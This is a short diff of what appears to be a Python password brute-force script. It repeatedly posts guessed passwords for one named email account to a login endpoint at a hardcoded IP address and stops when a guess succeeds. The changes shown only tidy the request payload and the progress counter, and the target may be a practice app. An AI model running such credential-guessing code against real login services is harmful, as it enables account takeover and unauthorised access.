@@ -15,8 +15,11 @@ failed = 0
 def test_password(password):
     global failed
     # print(failed)
-    data = {"email": 'Maggie.Simpson@simpsonmail.com', "password": password, }
-    data_json = json.dumps(data)
+
+    data = json.dumps({
+        "email": 'Maggie.Simpson@simpsonmail.com',
+        "password": password,
+    })
     headers = {
         'Content-type': 'application/json;charset=utf-8',
         'Referer': 'http://43.241.202.33:3003/',
@@ -24,7 +27,7 @@ def test_password(password):
 
     r = s.post(
         'http://43.241.202.33:3003/rest/user/login',
-        data=data_json,
+        data=data,
         headers=headers,
     )
 
@@ -35,7 +38,7 @@ def test_password(password):
         sys.exit()
     else:
         failed = failed + 1
-        if failed % 10000 == 0:
+        if failed % 1000 == 0:
             print(failed)
 
 
